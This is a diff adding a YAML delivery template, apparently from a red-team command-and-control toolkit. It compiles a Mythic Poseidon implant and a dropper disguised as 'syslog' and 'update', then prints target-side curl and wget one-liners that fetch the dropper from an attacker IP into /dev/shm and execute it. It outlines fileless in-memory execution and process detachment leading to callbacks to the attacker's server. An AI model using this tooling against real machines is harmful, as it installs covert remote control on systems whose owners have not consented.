@@ -1,0 +1,37 @@
+---
+metadata:
+  filename: "deliver-linux-x64-mythic-poseidon-http-stager-elf-detach.yaml"
+  tags: ["linux", "c2"]
+  created: "2026-05-31"
+  authors: ["@TIVKU"]
+
+content: |
+  mkdir -p packstation/outbound; \
+  command -v gcc > /dev/null 2>&1 || printf '%s\n' 'ERROR: gcc not found'; \
+  command -v gcc > /dev/null 2>&1 && \
+  {{ include('scripts/generate-mythic-poseidon-http-elf.yaml') }} && \
+  mv packstation/outbound/poseidon packstation/outbound/update && \
+  python -c "import base64; open('/tmp/dropper.c','w').write(base64.b64decode('{{ include('source_code/stager-linux-x64-poseidon-http-elf-detach.c') | base64 }}').decode())" && \
+  gcc -O2 -s /tmp/dropper.c -o packstation/outbound/syslog && \
+  rm /tmp/dropper.c && \
+  {{ python_path }} {{ templates_dir }}/helper_scripts/patch_elf_glibc_compat.py packstation/outbound/syslog && \
+  printf '%s\n' '================================================================' && \
+  printf '%s\n' '                      ------C2 Check------                      ' && \
+  printf '%s\n' 'Ensure Mythic C2 is running at {{ mythic_url }} (callback port: {{ mythic_callback_port }})' && \
+  printf '%s\n' '================================================================' && \
+  printf '%s\n' '                  ---Step-by-Step Delivery---                  ' && \
+  printf '%s\n' 'Run on target to spawn a beacon (curl):' && \
+  printf '%s\n' '  curl -o /dev/shm/syslog http://{{ attacker_ip }}:{{ delivery_outbound_port }}/syslog && chmod +x /dev/shm/syslog && /dev/shm/syslog' && \
+  printf '%s\n' 'Run on target to spawn a beacon (wget):' && \
+  printf '%s\n' '  wget http://{{ attacker_ip }}:{{ delivery_outbound_port }}/syslog -O /dev/shm/syslog && chmod +x /dev/shm/syslog && /dev/shm/syslog' && \
+  printf '%s\n' 'Attack chain on target execute:' && \
+  printf '%s\n' '  syslog (dropper) -> fetches update (Poseidon ELF) from http://{{ attacker_ip }}:{{ delivery_outbound_port }}/update' && \
+  printf '%s\n' '  -> executes fileless via memfd_create + fexecve (no ELF on disk)' && \
+  printf '%s\n' '  -> fork + setsid detaches from parent process' && \
+  printf '%s\n' '  -> Poseidon callbacks to {{ attacker_ip }}:{{ mythic_callback_port }}' && \
+  printf '%s\n' '================================================================' && \
+  printf '%s\n' '                  ---Files in packstation---                   ' && \
+  printf '%s\n' '  syslog  -> dropper ELF (deliver to target)' && \
+  printf '%s\n' '  update  -> Poseidon ELF (fetched by dropper at runtime)' && \
+  printf '%s\n' '================================================================' && \
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
